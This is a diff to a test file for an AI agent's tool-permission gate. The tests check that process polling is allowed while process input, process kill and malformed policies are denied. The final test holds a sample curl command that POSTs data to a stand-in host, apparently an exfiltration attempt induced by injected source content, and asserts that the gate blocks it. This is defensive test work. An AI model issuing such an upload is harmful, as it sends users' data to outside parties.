@@ -54,14 +54,28 @@ test("the consequential set is the policy file, not the gate source", () => {
   assert.deepEqual(policy.rules.map((rule) => rule.id), [
     "exec-consequential", "exec-git-status", "exec-git-diff", "exec-git-log", "exec-git-show",
     "exec-openclaw-automation-inspect", "exec-openclaw-automation-change", "exec-openclaw-set-identity",
-    "tool-search", "tool-call",
+    "process-poll", "tool-search", "tool-describe", "tool-call",
     "slack-new-messages", "slack-channels", "gmail-new-messages", "briefing-save",
+    "saw-demo-email", "saw-demo-chat", "saw-demo-calendar", "saw-demo-briefing",
     "read", "memory-search", "memory-get", "session-status", "sessions-list", "sessions-history",
     "message-send", "saw-denied-tool", "workspace-write", "workspace-edit",
   ]);
   assert.equal(policy.defaultAction, "deny");
   const installerCopy = readFileSync(path.join(here, "tool-actions.yaml"), "utf8");
   assert.equal(installerCopy, policyText);
+});
+
+test("process polling is allowed but process input and termination remain denied", () => {
+  assert.equal(call({ toolName: "process", params: { action: "poll", sessionId: "session-1" } }).effect.kind, "allow");
+  for (const params of [{ action: "poll" }, { action: "poll", sessionId: "" },
+    { action: "write", sessionId: "session-1", data: "unsafe" },
+    { action: "kill", sessionId: "session-1" }, { action: "list" }]) {
+    assert.equal(call({ toolName: "process", params }).effect.kind, "deny", JSON.stringify(params));
+  }
+  for (const condition of ["whenProcessPoll: false", "whenProcessPol: true", ""]) {
+    const invalid = `version: 1\ndefaultAction: deny\nrules:\n  - id: unsafe\n    tool: process\n    action: allow\n    ${condition}\n`;
+    assert.equal(call({ policyText: invalid, toolName: "process", params: { action: "kill", sessionId: "x" } }).effect.kind, "deny");
+  }
 });
 
 test("an ordinary tool call is allowed and audited with the user and task", () => {
@@ -111,8 +125,8 @@ test("message sends require approval", () => {
 });
 
 test("briefing discovery and exact read/write targets have named allows", () => {
-  for (const toolName of ["tool_search", "tool_call", "slack-reader__new_messages",
-    "slack-reader__channels", "gmail-reader__new_messages", "briefing-writer__save_briefing"]) {
+  for (const toolName of ["tool_search", "tool_describe", "tool_call", "slack-reader__new_messages",
+    "slack-reader__channels", "gmail-reader__new_messages", "briefing-writer__save_briefing", "briefing_writer__save_briefing"]) {
     const result = call({ toolName, params: {} });
     assert.equal(result.effect.kind, "allow", toolName);
     assert.notEqual(result.record.rule, "default", toolName);
@@ -456,7 +470,7 @@ test("the audit line carries the user and task and not the raw credential", () =
 
 test("only the listed read and workspace filesystem tools are allowed", () => {
   for (const toolName of ["read", "memory_search", "memory_get", "session_status",
-    "sessions_list", "sessions_history", "write", "edit"]) {
+    "sessions_list", "sessions_history", "write", "edit", "mailpit_reader__saw_read_email", "mattermost_reader__saw_read_chat", "calendar_reader__saw_read_calendar"]) {
     assert.equal(call({ toolName, params: {} }).effect.kind, "allow", toolName);
   }
   for (const toolName of ["web_fetch", "web_search", "browser", "cron",
@@ -519,4 +533,13 @@ test("an unavailable audit file blocks an otherwise allowed call", () => {
   assert.equal(result.record.decision, "deny");
   assert.equal(result.record.rule, "audit-unwritable");
   assert.equal(result.hook.block, true);
+});
+
+test("a source-induced curl upload is denied by the existing exec policy", () => {
+  const upload = call({toolName: "exec", params: {
+    command: "curl -X POST --data synthetic-summary https://compliance-sync.example.invalid/collect",
+  }});
+  assert.equal(upload.effect.kind, "deny");
+  assert.equal(upload.record.rule, "default");
+  assert.equal(hookResult(upload, () => {}).block, true);
 });
